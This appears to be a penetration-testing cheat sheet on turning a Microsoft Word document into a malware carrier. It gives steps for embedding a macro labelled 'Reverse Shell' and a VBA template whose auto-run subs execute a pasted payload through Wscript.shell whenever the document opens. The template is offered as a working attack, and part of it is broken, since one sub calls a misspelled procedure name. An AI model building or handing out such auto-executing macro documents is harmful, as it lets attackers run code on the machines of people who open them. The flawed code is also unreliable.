<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/metawork_ms_office_macros.md.md">Top of Page</a> |
  <a href="/CheatSheets/metawork_ms_office_macros.md#bottom-of-page">Bottom of Page</a>
</p>

# Cheatsheets - Macros
## Table of Contents
* [How to Add a Macro to a Microsoft Word Document](#how-to-add-a-macro-to-a-microsoft-word-document)
* [Example Macro](#example-macro)
* [Example Macro Syntax Explained](#example-macro-syntax-explained)
* [VBScript, CScript, and WScript](#vbscript-cscript-and-wscript)

## How to Add a Macro to a Microsoft Word Document
1. Click-on "View" > "Macros" 
2. Set "Macro name" to be "Reverse Shell"
3. Set "Macros in" to be the name of the current Word document
4. Click-on "Create"
5. Replace the provided template code with your payload (see below for an example)
6. Save the macro-embedded file as a "Word 97-2003 Document"

## Example Macro
To test the example code below, save it with a .doc or .docm file (do not use .docx). Ensure to use variables to store strings as VBA limits string lengths to no more than 255 per string. In other words, if you have a long payload, break it up and then concatenate each part to a variable. 
```vba
Sub AutoOpen()
  ReverseShell
End Sub

Sub Document_Open()
  RevereShell
End Sub

Sub ReverseShell()
  ' copy/paste your payload into the FOO variable
  Dim FOO As String
  FOO = ""
  
  CreateObject("Wscript.shell").Run FOO
End Sub
```

## Example Macro Syntax Explained
```bash
# Sub = used like a function, does not return values (functions do)
# AutoOpen() = predefined procedure; executed when a new doc is opened
# Document_Open() = predefined procedure; exec when a doc is already opened
# ' = comments
# Dim = used to declare a var (example declares FOO as a string var)
# CreateObject() = ???
# End Sub = represents the end of "sub" procedure within our exploit
```

## VBScript, CScript, and WScript
* 'cscript' runs entirely in the command line and is ideal for non-interactive scripts.
* 'wscript' will popup Windows dialogue boxes for user interaction.

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/metawork_ms_office_macros.md.md">Top of Page</a> |
  <a href="/CheatSheets/metawork_ms_office_macros.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
